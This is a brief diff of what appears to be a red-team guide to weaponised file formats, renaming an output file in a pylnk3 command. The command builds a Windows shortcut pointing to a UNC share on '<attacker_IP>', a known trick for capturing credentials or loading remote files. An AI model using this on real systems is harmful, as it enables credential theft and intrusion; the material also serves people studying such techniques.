@@ -127,7 +127,7 @@ Name it with `.jnlp` extension.
 TODO: Show it step by step.
 
 ```
-$ pylnk3 c \\<attacker_IP>\<share_name>\file.ext implant.lnk
+$ pylnk3 c \\<attacker_IP>\<share_name>\file.ext payload.lnk
 ```
 
 ## 04 - Web Query
